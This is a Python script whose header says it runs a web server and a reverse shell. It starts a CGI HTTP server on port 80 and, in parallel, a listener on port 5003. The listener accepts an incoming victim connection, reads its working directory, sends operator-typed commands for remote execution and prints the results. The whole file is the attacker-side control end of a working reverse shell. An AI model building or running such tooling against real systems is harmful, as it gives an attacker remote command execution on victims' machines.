# the purpose of this file is to have a server that serve as html, and reverse shell


import threading
import os, socket
from http.server import HTTPServer, CGIHTTPRequestHandler

def htmlfunction():
    server_object = HTTPServer(server_address=('', 80), RequestHandlerClass=CGIHTTPRequestHandler)
    server_object.serve_forever()


def reverseshellfunction():
    SERVER_HOST = "0.0.0.0"
    SERVER_PORT = 5003
    BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
    # separator string for sending 2 messages in one go
    SEPARATOR = "<sep>"

    s = socket.socket()

    s.bind((SERVER_HOST, SERVER_PORT))
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.listen(5)
    print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")

    # accept any connections attempted
    client_socket, client_address = s.accept()
    print(f"{client_address[0]}:{client_address[1]} Connected!")
    
    # receiving the current working directory of the client
    cwd = client_socket.recv(BUFFER_SIZE).decode()
    print("[+] Current working directory:", cwd)
    
    while True:
        # get the command from prompt
        command = input(f"{cwd} $> ")
        if not command.strip():
            # empty command
            continue
        # send the command to the client
        client_socket.send(command.encode())
        if command.lower() == "exit":
            # if the command is exit, just break out of the loop
            break
        # retrieve command results
        output = client_socket.recv(BUFFER_SIZE).decode()
        print("output:", output)
        # split command output and current directory
        #results, cwd = output.split(SEPARATOR)
        # print output
        #print(results)
    # close connection to the client
    client_socket.close()
    # close server connection
    s.close()
    
#htmlfunction()
#reverseshellfunction()
    
if __name__ == '__main__':

         t1 = threading.Thread(target=reverseshellfunction)
         t2 = threading.Thread(target=htmlfunction)
         t1.start()
         t2.start()
    